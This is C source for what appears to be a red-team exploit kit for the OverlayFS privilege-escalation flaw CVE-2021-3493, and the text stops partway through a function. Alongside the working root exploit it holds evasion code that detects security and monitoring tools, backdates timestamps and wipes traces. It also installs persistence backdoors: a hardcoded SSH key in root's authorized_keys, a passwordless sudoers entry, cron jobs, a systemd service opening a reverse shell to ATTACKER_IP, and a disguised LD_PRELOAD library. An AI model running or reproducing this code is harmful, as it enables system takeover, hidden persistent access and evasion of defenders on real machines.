/*
 * OverlayFS Capability Privilege Escalation Framework
 * Red Team Professional Edition
 *
 * Comprehensive exploit demonstrating CVE-2021-3493 with advanced
 * red team features including persistence, stealth, and post-exploitation.
 *
 * Target: CVE-2021-3493 (OverlayFS Privilege Escalation)
 * Created by: George S. Yanni
 * Original Advisory: https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/
 *
 * Compile: gcc -o overlayfs_exploit overlayfs_exploit.c
 *
 * WARNING: For educational and authorized testing purposes only.
 * DO NOT use against actual production systems.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/resource.h>
#include <sys/xattr.h>
#include <sys/syslog.h>
#include <time.h>
#include <limits.h>
#include <stdarg.h>
#include <pwd.h>
#include <grp.h>
#include <dirent.h>
#include <libgen.h>

extern char **environ;

/* ==================== CONFIGURATION ==================== */
#define DIR_BASE "./ovlcap"
#define DIR_WORK DIR_BASE "/work"
#define DIR_LOWER DIR_BASE "/lower"
#define DIR_UPPER DIR_BASE "/upper"
#define DIR_MERGE DIR_BASE "/merge"
#define BIN_MERGE DIR_MERGE "/magic"
#define BIN_UPPER DIR_UPPER "/magic"
#define MAX_PATH_LEN 4096

/* Capability: all+ep */
static const char CAP_ALL_EP[] =
    "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00"
    "\xff\xff\xff\xff\x00\x00\x00\x00";

/* SSH Public Key for persistence */
static const char *SSH_PUBKEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCraH13h7hfOvP6fj8kDxFmZBWXFsXuNjJecO+Jn9WOl5nVKNiQD4YeHE9q2/W4tYgmTKu/ncE6FXzI/VRCThsuX+Al5zmoTG2wjnyxqgXilUtLZgez+cwEqSEXMtO9FH6xSoPN4uhBGCI9L5abh9wAuhz/jpg1dIbnv0xNko7/+YML9t9Gzoq0eqK19NEM9P4xEOtIQ7d0eN9vhNB4sianZi5/9tv6kRAUCHzkV0KBLUJvO7IouugvFT+QqfKwO2VJtJZ7Si+R7zOW3QO8RhwFGKBD9G9hjG1tKog8o0WoMCpelXNO+qVdk3FdeiVY66/774FNGXG2v2z2nzUTmwG1tZoSM5ksHwkKp3vtRlESNrsJ3547hWXTDtNhlD3ulF2d5d9NVN7wtEVs5IYYFlessyQWFI0Ikjd9bh50lYkCjwZP+0l2iGQj5DDjXQSGesT9l3xOTeFfBlfFXH5L506mBtOW4AsQ0PQn78ik48sODSK3UUVXHMeAj/zP/wLqlNqux0bq+p/B0u5CyogSC8SK3HYGfigWfiz0edtWVRf3S9Ue5pKC48nYzePKCbPYUNXhvIzaaxJP+dIaPCTOskhJ/gQHnNvjfusEcsNLzZD4DOcfflOYSHiNZ9aHauvAnzr8a1zi96947JgFa4lghDyMN5vbsC6wdS/HRPqE/UqUDw== htb-ac-1755622@htb-gae5qct64w";

/* ==================== LOGGING SYSTEM ==================== */
#define LOG_LVL_DEBUG 0
#define LOG_LVL_INFO 1
#define LOG_LVL_WARN 2
#define LOG_LVL_ERROR 3
#define LOG_LVL_FATAL 4

#define COLOR_RED "\033[1;31m"
#define COLOR_GREEN "\033[1;32m"
#define COLOR_YELLOW "\033[1;33m"
#define COLOR_BLUE "\033[1;34m"
#define COLOR_MAGENTA "\033[1;35m"
#define COLOR_CYAN "\033[1;36m"
#define COLOR_RESET "\033[0m"

static int verbose = 1;
static int stealth_mode = 0;

/* Store original user credentials before privilege escalation */
static uid_t original_uid = 0;
static gid_t original_gid = 0;
static char original_username[256] = {0};

/* Store original binary path before exec */
static char original_binary_path[PATH_MAX] = {0};

static void log_msg(int level, const char *fmt, ...)
{
    if (!verbose && level == LOG_LVL_DEBUG)
        return;

    va_list args;
    va_start(args, fmt);

    const char *color = COLOR_RESET;
    const char *prefix = "";

    switch (level)
    {
    case LOG_LVL_DEBUG:
        color = COLOR_BLUE;
        prefix = "[DEBUG]";
        break;
    case LOG_LVL_INFO:
        color = COLOR_CYAN;
        prefix = "[INFO]";
        break;
    case LOG_LVL_WARN:
        color = COLOR_YELLOW;
        prefix = "[WARN]";
        break;
    case LOG_LVL_ERROR:
        color = COLOR_RED;
        prefix = "[ERROR]";
        break;
    case LOG_LVL_FATAL:
        color = COLOR_MAGENTA;
        prefix = "[FATAL]";
        break;
    }

    if (stealth_mode && level <= LOG_LVL_INFO)
    {
        // In stealth mode, only show errors
        va_end(args);
        return;
    }

    printf("%s%s ", color, prefix);
    vprintf(fmt, args);
    printf("%s\n", COLOR_RESET);
    va_end(args);
}

/* ==================== SYSTEM DETECTION ==================== */
static int detect_kernel_version()
{
    struct utsname uts;
    if (uname(&uts) == 0)
    {
        log_msg(LOG_LVL_INFO, "System: %s %s %s", uts.sysname, uts.release, uts.machine);

        int major = 0, minor = 0, patch = 0;
        if (sscanf(uts.release, "%d.%d.%d", &major, &minor, &patch) >= 2)
        {
            log_msg(LOG_LVL_INFO, "Kernel version: %d.%d.%d", major, minor, patch);

            // Check for vulnerable versions (example range)
            if (major == 5 && minor >= 15 && minor <= 19)
            {
                log_msg(LOG_LVL_INFO, "Kernel appears vulnerable to CVE-2023-0386");
                return 1;
            }
            else if (major == 6 && minor <= 3)
            {
                log_msg(LOG_LVL_INFO, "Kernel may be vulnerable to similar OverlayFS issues");
                return 1;
            }
        }
    }
    return 0;
}

static int detect_security_modules()
{
    int ret = 0;

    // Check SELinux
    if (access("/sys/fs/selinux", F_OK) == 0)
    {
        log_msg(LOG_LVL_WARN, "SELinux detected");
        ret |= 1;
    }

    // Check AppArmor
    FILE *fp = fopen("/sys/module/apparmor/parameters/enabled", "r");
    if (fp)
    {
        char enabled;
        if (fread(&enabled, 1, 1, fp) == 1 && enabled == 'Y')
        {
            log_msg(LOG_LVL_WARN, "AppArmor detected");
            ret |= 2;
        }
        fclose(fp);
    }

    // Check grsecurity/PaX
    if (access("/proc/sys/kernel/grsecurity", F_OK) == 0 ||
        access("/proc/sys/kernel/pax", F_OK) == 0)
    {
        log_msg(LOG_LVL_WARN, "grsecurity/PaX detected");
        ret |= 4;
    }

    return ret;
}

static int detect_monitoring_tools()
{
    const char *tools[] = {
        "auditd", "tripwire", "aide", "ossec",
        "rkhunter", "chkrootkit", "lynis", "sysdig",
        "falco", "wazuh", NULL};

    int detected = 0;
    char cmd[256];

    for (int i = 0; tools[i]; i++)
    {
        snprintf(cmd, sizeof(cmd), "pgrep -x %s >/dev/null 2>&1", tools[i]);
        if (system(cmd) == 0)
        {
            log_msg(LOG_LVL_WARN, "Monitoring tool detected: %s", tools[i]);
            detected = 1;
        }

        // Also check for processes containing the name
        snprintf(cmd, sizeof(cmd), "ps aux | grep -i %s | grep -v grep", tools[i]);
        FILE *fp = popen(cmd, "r");
        if (fp)
        {
            char buf[256];
            if (fgets(buf, sizeof(buf), fp))
            {
                log_msg(LOG_LVL_WARN, "Process found: %s", tools[i]);
                detected = 1;
            }
            pclose(fp);
        }
    }

    return detected;
}

/* ==================== STEALTH & OPSEC ==================== */
static void enable_stealth_mode()
{
    log_msg(LOG_LVL_DEBUG, "Enabling stealth mode");
    stealth_mode = 1;

    // Lower process priority
    nice(19);

    // Disable core dumps
    struct rlimit rlim = {0, 0};
    setrlimit(RLIMIT_CORE, &rlim);

    // Try to disable core pattern if root
    if (getuid() == 0)
    {
        system("echo '|/bin/false' > /proc/sys/kernel/core_pattern 2>/dev/null");
    }

    // Clear environment variables that might leak info
    clearenv();
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);

    log_msg(LOG_LVL_INFO, "Stealth mode activated");
}

static void secure_wipe_file(const char *path)
{
    struct stat st;
    if (stat(path, &st) == 0)
    {
        int fd = open(path, O_WRONLY);
        if (fd != -1)
        {
            // Overwrite with random data 3 times (DoD 5220.22-M standard)
            char data[4096];
            for (int pass = 0; pass < 3; pass++)
            {
                lseek(fd, 0, SEEK_SET);
                for (off_t i = 0; i < st.st_size; i += sizeof(data))
                {
                    // Fill with different patterns each pass
                    memset(data, pass == 0 ? 0xFF : (pass == 1 ? 0x00 : 0xAA), sizeof(data));
                    write(fd, data, sizeof(data));
                }
                fsync(fd);
            }
            close(fd);
        }
        unlink(path);
        log_msg(LOG_LVL_DEBUG, "Securely wiped: %s", path);
    }
}

static void modify_file_timestamps(const char *path, time_t new_time)
{
    struct timespec times[2];
    times[0].tv_sec = new_time;
    times[0].tv_nsec = 0;
    times[1] = times[0];

    if (utimensat(AT_FDCWD, path, times, 0) == 0)
    {
        log_msg(LOG_LVL_DEBUG, "Modified timestamps for: %s", path);
    }
}

/* ==================== UTILITY FUNCTIONS ==================== */
static int safe_mkdir(const char *path, mode_t mode)
{
    if (strlen(path) >= MAX_PATH_LEN)
    {
        errno = ENAMETOOLONG;
        return -1;
    }

    if (mkdir(path, mode) == -1 && errno != EEXIST)
    {
        log_msg(LOG_LVL_ERROR, "mkdir %s: %s", path, strerror(errno));
        return -1;
    }

    // Set timestamps to obscure activity
    if (stealth_mode)
    {
        modify_file_timestamps(path, time(NULL) - 86400); // 1 day ago
    }

    log_msg(LOG_LVL_DEBUG, "Created directory: %s", path);
    return 0;
}

static int safe_writefile(const char *path, const char *data)
{
    if (strlen(path) >= MAX_PATH_LEN)
    {
        errno = ENAMETOOLONG;
        return -1;
    }

    // For proc files, use O_WRONLY only (no O_CREAT)
    // For regular files, use O_WRONLY | O_CREAT | O_TRUNC
    int fd;
    if (strncmp(path, "/proc/", 6) == 0)
    {
        fd = open(path, O_WRONLY);
    }
    else
    {
        fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    }

    if (fd == -1)
    {
        log_msg(LOG_LVL_ERROR, "open %s: %s", path, strerror(errno));
        return -1;
    }

    ssize_t len = (ssize_t)strlen(data);
    ssize_t written = write(fd, data, len);
    close(fd);

    if (written != len)
    {
        log_msg(LOG_LVL_ERROR, "write %s: %s", path, strerror(errno));
        return -1;
    }

    if (stealth_mode && strncmp(path, "/proc/", 6) != 0)
    {
        modify_file_timestamps(path, time(NULL) - 86400);
    }

    log_msg(LOG_LVL_DEBUG, "Wrote to file: %s", path);
    return 0;
}

static int safe_copyfile(const char *src, const char *dst, mode_t mode)
{
    if (strlen(src) >= MAX_PATH_LEN || strlen(dst) >= MAX_PATH_LEN)
    {
        errno = ENAMETOOLONG;
        return -1;
    }

    int fi = open(src, O_RDONLY);
    if (fi == -1)
    {
        log_msg(LOG_LVL_ERROR, "open source %s: %s", src, strerror(errno));
        return -1;
    }

    int fo = open(dst, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fo == -1)
    {
        log_msg(LOG_LVL_ERROR, "open destination %s: %s", dst, strerror(errno));
        close(fi);
        return -1;
    }

    char buf[4096];
    ssize_t rd, wr;
    int ret = 0;

    for (;;)
    {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0)
        {
            break;
        }
        else if (rd == -1)
        {
            if (errno == EINTR)
                continue;
            log_msg(LOG_LVL_ERROR, "read %s: %s", src, strerror(errno));
            ret = -1;
            break;
        }

        char *p = buf;
        while (rd > 0)
        {
            wr = write(fo, p, rd);
            if (wr == -1)
            {
                if (errno == EINTR)
                    continue;
                log_msg(LOG_LVL_ERROR, "write %s: %s", dst, strerror(errno));
                ret = -1;
                goto cleanup;
            }
            p += wr;
            rd -= wr;
        }
    }

    if (stealth_mode)
    {
        modify_file_timestamps(dst, time(NULL) - 86400);
    }

    log_msg(LOG_LVL_DEBUG, "Copied file: %s -> %s", src, dst);

cleanup:
    close(fi);
    close(fo);
    return ret;
}

static void cleanup_exploit_dirs(void)
{
    char cmd[MAX_PATH_LEN];
    int ret;

    ret = snprintf(cmd, sizeof(cmd), "rm -rf '%s/' 2>/dev/null", DIR_BASE);
    if (ret < 0 || ret >= (int)sizeof(cmd))
    {
        log_msg(LOG_LVL_ERROR, "Path too long for cleanup");
        return;
    }

    log_msg(LOG_LVL_DEBUG, "Cleaning up exploit artifacts");

    if (stealth_mode)
    {
        // Secure wipe each directory before removal
        char *dirs[] = {DIR_MERGE, DIR_UPPER, DIR_LOWER, DIR_WORK, DIR_BASE, NULL};
        for (int i = 0; dirs[i]; i++)
        {
            struct stat st;
            if (stat(dirs[i], &st) == 0 && S_ISDIR(st.st_mode))
            {
                // Find and wipe all files in directory
                char find_cmd[512];
                snprintf(find_cmd, sizeof(find_cmd),
                         "find '%s' -type f -exec sh -c 'dd if=/dev/urandom of=\"$1\" bs=1M count=1 2>/dev/null; rm -f \"$1\"' _ {} \\; 2>/dev/null",
                         dirs[i]);
                system(find_cmd);

                // Remove directory
                rmdir(dirs[i]);
            }
        }
    }
    else
    {
        system(cmd);
    }
}

/* ==================== CORE EXPLOIT ==================== */
static int setup_userns_mappings(uid_t uid, gid_t gid)
{
    char buf[256];
    int ret;

    // Deny setgroups to allow gid mapping
    if (safe_writefile("/proc/self/setgroups", "deny") == -1)
        return -1;

    // Map current UID to root in namespace
    ret = snprintf(buf, sizeof(buf), "0 %d 1", uid);
    if (ret < 0 || ret >= (int)sizeof(buf))
        return -1;
    if (safe_writefile("/proc/self/uid_map", buf) == -1)
        return -1;

    // Map current GID to root in namespace
    ret = snprintf(buf, sizeof(buf), "0 %d 1", gid);
    if (ret < 0 || ret >= (int)sizeof(buf))
        return -1;
    if (safe_writefile("/proc/self/gid_map", buf) == -1)
        return -1;

    log_msg(LOG_LVL_DEBUG, "Configured user namespace mappings (uid=%d, gid=%d)", uid, gid);
    return 0;
}

static int run_overlayfs_exploit(void)
{
    char mount_opts[MAX_PATH_LEN];
    int ret;

    // Clean up any previous artifacts
    cleanup_exploit_dirs();

    // Create directory structure
    if (safe_mkdir(DIR_BASE, 0755) == -1 ||
        safe_mkdir(DIR_WORK, 0755) == -1 ||
        safe_mkdir(DIR_LOWER, 0755) == -1 ||
        safe_mkdir(DIR_UPPER, 0755) == -1 ||
        safe_mkdir(DIR_MERGE, 0755) == -1)
    {
        log_msg(LOG_LVL_ERROR, "Failed to create directory structure");
        return -1;
    }

    // Get current user credentials (store original before namespace)
    uid_t uid = getuid();
    gid_t gid = getgid();

    // Store original credentials for post-exploitation use
    original_uid = uid;
    original_gid = gid;

    // Get and store original username
    struct passwd *pw = getpwuid(uid);
    if (pw)
    {
        strncpy(original_username, pw->pw_name, sizeof(original_username) - 1);
        original_username[sizeof(original_username) - 1] = '\0';
    }
    else
    {
        // Fallback: use UID as string
        snprintf(original_username, sizeof(original_username), "uid_%d", uid);
    }

    log_msg(LOG_LVL_INFO, "Current UID: %d, GID: %d (Username: %s)", uid, gid, original_username);

    // Create new user and mount namespace
    log_msg(LOG_LVL_INFO, "Creating user namespace");
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
    {
        log_msg(LOG_LVL_ERROR, "unshare failed: %s", strerror(errno));
        return -1;
    }

    // Setup namespace mappings
    if (setup_userns_mappings(uid, gid) == -1)
    {
        log_msg(LOG_LVL_ERROR, "Failed to setup user namespace mappings");
        return -1;
    }

    // Mount overlay filesystem
    ret = snprintf(mount_opts, sizeof(mount_opts),
                   "lowerdir=%s,upperdir=%s,workdir=%s",
                   DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (ret < 0 || ret >= (int)sizeof(mount_opts))
    {
        log_msg(LOG_LVL_ERROR, "Mount options too long");
        return -1;
    }

    log_msg(LOG_LVL_INFO, "Mounting overlayfs");
    if (mount("overlay", DIR_MERGE, "overlay", 0, mount_opts) == -1)
    {
        log_msg(LOG_LVL_ERROR, "mount overlay failed: %s", strerror(errno));
        return -1;
    }

    // Copy current executable to overlay
    log_msg(LOG_LVL_INFO, "Copying executable to overlay");
    if (safe_copyfile("/proc/self/exe", BIN_MERGE, 0755) == -1)
    {
        log_msg(LOG_LVL_ERROR, "Failed to copy executable");
        return -1;
    }

    // Set full capabilities on the binary
    log_msg(LOG_LVL_INFO, "Setting capabilities on binary");
    if (setxattr(BIN_MERGE, "security.capability",
                 CAP_ALL_EP, sizeof(CAP_ALL_EP) - 1, 0) == -1)
    {
        log_msg(LOG_LVL_ERROR, "setxattr failed on %s: %s", BIN_MERGE, strerror(errno));
        return -1;
    }

    // Sync filesystem to ensure all data is written to upper directory
    sync();

    log_msg(LOG_LVL_INFO, "Exploit setup complete");
    return 0;
}

/* ==================== BACKDOOR & PERSISTENCE ==================== */
static int inject_ssh_key()
{
    log_msg(LOG_LVL_INFO, "Injecting SSH backdoor key");

    // Inject to root's .ssh directory (always root for SSH backdoor)
    char ssh_dir[PATH_MAX];
    snprintf(ssh_dir, sizeof(ssh_dir), "/root/.ssh");

    if (access(ssh_dir, F_OK) != 0)
    {
        if (mkdir(ssh_dir, 0700) == -1)
        {
            log_msg(LOG_LVL_ERROR, "Failed to create /root/.ssh: %s", strerror(errno));
            return -1;
        }
    }

    // Add key to authorized_keys
    char auth_keys[PATH_MAX];
    snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);

    FILE *fp = fopen(auth_keys, "a");
    if (!fp)
    {
        log_msg(LOG_LVL_ERROR, "Failed to open authorized_keys: %s", strerror(errno));
        return -1;
    }

    fprintf(fp, "\n%s\n", SSH_PUBKEY);
    fclose(fp);

    // Set proper permissions
    chmod(auth_keys, 0600);
    chown(auth_keys, 0, 0);

    log_msg(LOG_LVL_INFO, "SSH key injected successfully to /root/.ssh/authorized_keys");
    return 0;
}

static int install_sudo_backdoor()
{
    log_msg(LOG_LVL_INFO, "Installing sudo backdoor");

    // Use the original username stored before privilege escalation
    const char *target_user = original_username[0] ? original_username : "0xyanni";

    // Method 1: Add user to sudoers.d (preferred)
    FILE *fp = fopen("/etc/sudoers.d/0xyanni", "w");
    if (fp)
    {
        fprintf(fp, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", target_user);
        fclose(fp);
        chmod("/etc/sudoers.d/0xyanni", 0440);
        log_msg(LOG_LVL_INFO, "Created sudoers file for user: %s", target_user);
        log_msg(LOG_LVL_INFO, "User %s can now run 'sudo <command>' without password", target_user);
        return 0;
    }

    // Method 2: Modify existing sudoers (fallback)
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "echo '%s ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers 2>/dev/null", target_user);
    system(cmd);

    log_msg(LOG_LVL_INFO, "Sudo backdoor installed for user: %s", target_user);
    log_msg(LOG_LVL_INFO, "User %s can now run 'sudo <command>' without password", target_user);
    return 0;
}

static int install_cron_persistence()
{
    log_msg(LOG_LVL_INFO, "Installing cron persistence");

    char cron_cmd[512];
    char self_path[PATH_MAX];
    int ret;

    // Priority order for getting binary path:
    // 1. Environment variable (passed from parent)
    // 2. Stored original path
    // 3. Current executable path
    // 4. Fallback to BIN_UPPER

    const char *env_path = getenv("ORIGINAL_BINARY_PATH");
    if (env_path && env_path[0] != '\0')
    {
        strncpy(self_path, env_path, sizeof(self_path) - 1);
        self_path[sizeof(self_path) - 1] = '\0';
        log_msg(LOG_LVL_DEBUG, "Using binary path from environment: %s", self_path);
    }
    else if (original_binary_path[0] != '\0')
    {
        strncpy(self_path, original_binary_path, sizeof(self_path) - 1);
        self_path[sizeof(self_path) - 1] = '\0';
        log_msg(LOG_LVL_DEBUG, "Using stored original binary path: %s", self_path);
    }
    else if (readlink("/proc/self/exe", self_path, sizeof(self_path) - 1) != -1)
    {
        self_path[sizeof(self_path) - 1] = '\0';
        log_msg(LOG_LVL_DEBUG, "Using current executable path: %s", self_path);
    }
    else
    {
        // Final fallback
        strcpy(self_path, BIN_UPPER);
        log_msg(LOG_LVL_WARN, "Using fallback path: %s", self_path);
    }

    // Convert to absolute path if it's relative
    if (self_path[0] != '/')
    {
        char abs_path[PATH_MAX];
        char *cwd = getcwd(NULL, 0);
        if (cwd)
        {
            snprintf(abs_path, sizeof(abs_path), "%s/%s", cwd, self_path);
            strncpy(self_path, abs_path, sizeof(self_path) - 1);
            self_path[sizeof(self_path) - 1] = '\0';
            free(cwd);
        }
    }

    log_msg(LOG_LVL_INFO, "Using binary path for cron: %s", self_path);

    // Check if cron job already exists in /etc/crontab
    char check_cmd[512];
    snprintf(check_cmd, sizeof(check_cmd),
             "grep -q '%s --stealth' /etc/crontab 2>/dev/null",
             self_path);
    ret = system(check_cmd);

    if (ret == 0)
    {
        log_msg(LOG_LVL_INFO, "Cron job already exists in /etc/crontab, skipping");
    }
    else
    {
        // Create a root cron job in /etc/crontab
        // Use absolute path and quote it properly
        char cron_line[512];
        snprintf(cron_line, sizeof(cron_line), "*/5 * * * * root %s --stealth", self_path);

        // Verify the binary path exists
        if (access(self_path, F_OK) != 0)
        {
            log_msg(LOG_LVL_WARN, "Binary path does not exist: %s", self_path);
            log_msg(LOG_LVL_WARN, "Cron job will fail if binary is not available at this path");
        }

        // Write to /etc/crontab directly using fopen (more reliable than system echo)
        FILE *crontab_fp = fopen("/etc/crontab", "a");
        if (crontab_fp)
        {
            if (fprintf(crontab_fp, "%s\n", cron_line) > 0)
            {
                fclose(crontab_fp);
                log_msg(LOG_LVL_INFO, "Successfully added root cron job to /etc/crontab");
                log_msg(LOG_LVL_INFO, "Cron entry: %s", cron_line);
            }
            else
            {
                fclose(crontab_fp);
                log_msg(LOG_LVL_ERROR, "Failed to write to /etc/crontab: %s", strerror(errno));
            }
        }
        else
        {
            log_msg(LOG_LVL_ERROR, "Failed to open /etc/crontab for writing: %s", strerror(errno));
            // Fallback to system() method
            snprintf(cron_cmd, sizeof(cron_cmd),
                     "echo '%s' >> /etc/crontab 2>/dev/null",
                     cron_line);
            ret = system(cron_cmd);
            if (ret == 0)
            {
                log_msg(LOG_LVL_INFO, "Added root cron job to /etc/crontab (via echo fallback)");
            }
            else
            {
                log_msg(LOG_LVL_ERROR, "Failed to add root cron job: system() returned %d", ret);
            }
        }
    }

    // Also add to original user's crontab
    // Use the stored original username and UID
    const char *target_user = original_username[0] ? original_username : "0xyanni";

    // Create temporary file for user's crontab
    char tmp_cron[256];
    snprintf(tmp_cron, sizeof(tmp_cron), "/tmp/user_cron_%d.tmp", getpid());

    // Get existing crontab for the user (if any) and filter out duplicate entries
    char get_cron[512];
    snprintf(get_cron, sizeof(get_cron),
             "sudo -u %s crontab -l 2>/dev/null | grep -v '%s' > %s 2>/dev/null || touch %s",
             target_user, self_path, tmp_cron, tmp_cron);
    system(get_cron);

    // Check if cron job already exists
    char check_user_cron[512];
    snprintf(check_user_cron, sizeof(check_user_cron),
             "sudo -u %s crontab -l 2>/dev/null | grep -q '%s --check'",
             target_user, self_path);
    ret = system(check_user_cron);

    if (ret == 0)
    {
        log_msg(LOG_LVL_INFO, "User cron job already exists for: %s, skipping", target_user);
        unlink(tmp_cron); // Cleanup temp file
    }
    else
    {
        // Append new cron job to temp file
        FILE *fp = fopen(tmp_cron, "a");
        if (fp)
        {
            fprintf(fp, "*/10 * * * * %s --check\n", self_path);
            fclose(fp);

            // Install the crontab for the user
            char install_cron[512];
            snprintf(install_cron, sizeof(install_cron),
                     "sudo -u %s crontab %s 2>/dev/null",
                     target_user, tmp_cron);
            ret = system(install_cron);

            // Cleanup temp file
            unlink(tmp_cron);

            if (ret == 0)
            {
                log_msg(LOG_LVL_INFO, "Added user cron job for: %s", target_user);
            }
            else
            {
                log_msg(LOG_LVL_WARN, "Failed to add user cron job for: %s (may need to run manually)", target_user);
            }
        }
        else
        {
            log_msg(LOG_LVL_WARN, "Failed to create temp file for user crontab");
        }
    }

    log_msg(LOG_LVL_INFO, "Cron persistence installed");
    log_msg(LOG_LVL_INFO, "Root cron: */5 * * * * (every 5 minutes)");
    log_msg(LOG_LVL_INFO, "User cron: */10 * * * * (every 10 minutes) for user: %s", target_user);
    return 0;
}

static int install_systemd_service()
{
    log_msg(LOG_LVL_INFO, "Installing systemd service backdoor");

    // Create a systemd service file
    const char *service_content =
        "[Unit]\n"
        "Description=System Maintenance Service\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=/bin/bash -c 'sleep 300 && /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n"
        "Restart=always\n"
        "RestartSec=60\n"
        "User=root\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    FILE *fp = fopen("/etc/systemd/system/system-maintenance.service", "w");
    if (fp)
    {
        fprintf(fp, "%s", service_content);
        fclose(fp);

        // Enable and start the service
        system("systemctl daemon-reload 2>/dev/null");
        system("systemctl enable system-maintenance.service 2>/dev/null");
        system("systemctl start system-maintenance.service 2>/dev/null");

        log_msg(LOG_LVL_INFO, "Systemd service installed");
        return 0;
    }

    return -1;
}

static int install_ld_preload_backdoor()
{
    log_msg(LOG_LVL_INFO, "Installing LD_PRELOAD backdoor (with shell prompt modification)");

    // Use a more permanent location than /tmp (which may be cleaned)
    const char *lib_path = "/usr/local/lib/libpam_systemd.so";
    const char *src_path = "/tmp/backdoor_source.c";

    // Ensure /usr/local/lib exists
    system("mkdir -p /usr/local/lib 2>/dev/null");

    // Create a shared library backdoor that injects "Hacked By George Yanni" before command output
    const char *so_content =
        "#define _GNU_SOURCE\n"
        "#include <stdio.h>\n"
        "#include <unistd.h>\n"
        "#include <dlfcn.h>\n"
        "#include <stdlib.h>\n"
        "#include <string.h>\n"
        "#include <stdarg.h>\n\n"
        "// Cache original function pointers\n"
        "static ssize_t (*orig_write)(int, const void *, size_t) = NULL;\n"
        "static int (*orig_vprintf)(const char *, va_list) = NULL;\n"
        "static int (*orig_puts)(const char *) = NULL;\n"
        "\n"
        "// Static flags to prevent recursive printing\n"
        "static int printing_banner = 0;\n"
        "static int first_output = 1;\n\n"
        "// Function to print the banner (only once per command)\n"
        "static void print_banner(void) {\n"
        "    if (!printing_banner && first_output) {\n"
        "        printing_banner = 1;\n"
        "        first_output = 0;\n"
        "        // Use cached original write function (must be initialized in constructor)\n"
        "        if (orig_write) {\n"
        "            // Banner text - manually count: \"\\n[Hacked By George Yanni]\\n\" = 29 chars\n"
        "            const char banner[] = \"\\n[Hacked By George Yanni]\\n\";\n"
        "            orig_write(STDOUT_FILENO, banner, 29);\n"
        "        }\n"
        "        printing_banner = 0;\n"
        "    }\n"
        "}\n\n"
        "// Hook printf\n"
        "int printf(const char *format, ...) {\n"
        "    if (!orig_vprintf) orig_vprintf = (int (*)(const char *, va_list))dlsym(RTLD_NEXT, \"vprintf\");\n"
        "    if (!orig_vprintf) return 0;\n"
        "    \n"
        "    print_banner();\n"
        "    \n"
        "    va_list args;\n"
        "    va_start(args, format);\n"
        "    int ret = orig_vprintf(format, args);\n"
        "    va_end(args);\n"
        "    return ret;\n"
        "}\n\n"
        "// Hook puts\n"
        "int puts(const char *s) {\n"
        "    if (!orig_puts) orig_puts = (int (*)(const char *))dlsym(RTLD_NEXT, \"puts\");\n"
        "    if (!orig_puts) return 0;\n"
        "    \n"
        "    print_banner();\n"
        "    \n"
        "    return orig_puts(s);\n"
        "}\n\n"
        "\n"
        "// Hook fwrite (for buffered output used by some commands)\n"
        "size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) {\n"
        "    size_t (*orig_fwrite)(const void *, size_t, size_t, FILE *) = NULL;\n"
        "    orig_fwrite = (size_t (*)(const void *, size_t, size_t, FILE *))dlsym(RTLD_NEXT, \"fwrite\");\n"
        "    if (!orig_fwrite) return 0;\n"
        "    \n"
        "    // Print banner if writing to stdout/stderr\n"
        "    if (stream == stdout || stream == stderr) {\n"
        "        if (first_output && !printing_banner) {\n"
        "            print_banner();\n"
        "        }\n"
        "    }\n"
        "    \n"
        "    return orig_fwrite(ptr, size, nmemb, stream);\n"
        "}\n\n"
        "// Hook write (for lower-level output - CRITICAL for ls, pwd, etc.)\n"
        "ssize_t write(int fd, const void *buf, size_t count) {\n"
        "    if (!orig_write) orig_write = (ssize_t (*)(int, const void *, size_t))dlsym(RTLD_NEXT, \"write\");\n"
        "    if (!orig_write) return 0;\n"
        "    \n"
        "    // Intercept stdout/stderr - MUST print banner on first output\n"
        "    if (fd == STDOUT_FILENO || fd == STDERR_FILENO) {\n"
        "        if (first_output && !printing_banner) {\n"
        "            print_banner();\n"
        "        }\n"
        "    }\n"
        "    \n"
        "    return orig_write(fd, buf, count);\n"
        "}\n\n"
        "static void __attribute__((constructor)) init(void) {\n"
        "    // Reset flags for each new process\n"
        "    first_output = 1;\n"
        "    printing_banner = 0;\n"
        "    orig_write = NULL;\n"
        "    orig_vprintf = NULL;\n"
        "    orig_puts = NULL;\n"
        "    \n"
        "    // Skip if environment variable is set (prevents recursion)\n"
        "    if (getenv(\"LD_PRELOAD_BACKDOOR_SKIP\")) return;\n"
        "    \n"
        "    // Initialize function pointers early\n"
        "    orig_write = (ssize_t (*)(int, const void *, size_t))dlsym(RTLD_NEXT, \"write\");\n"
        "    orig_vprintf = (int (*)(const char *, va_list))dlsym(RTLD_NEXT, \"vprintf\");\n"
        "    orig_puts = (int (*)(const char *))dlsym(RTLD_NEXT, \"puts\");\n"
        "    \n"
        "    // Skip only critical system programs that cause real issues\n"
        "    FILE *f = fopen(\"/proc/self/cmdline\", \"r\");\n"
        "    if (f) {\n"
        "        char cmdline[512] = {0};\n"
        "        size_t n = fread(cmdline, 1, sizeof(cmdline) - 1, f);\n"
        "        fclose(f);\n"
        "        if (n > 0) {\n"
        "            cmdline[n] = '\\0';\n"
        "            // Only skip systemctl and ld.so - allow all other commands\n"
        "            if (strstr(cmdline, \"systemctl\") || strstr(cmdline, \"ld.so\")) {\n"
        "                return;\n"
        "            }\n"
        "        }\n"
        "    }\n"
        "}\n";

    FILE *fp = fopen(src_path, "w");
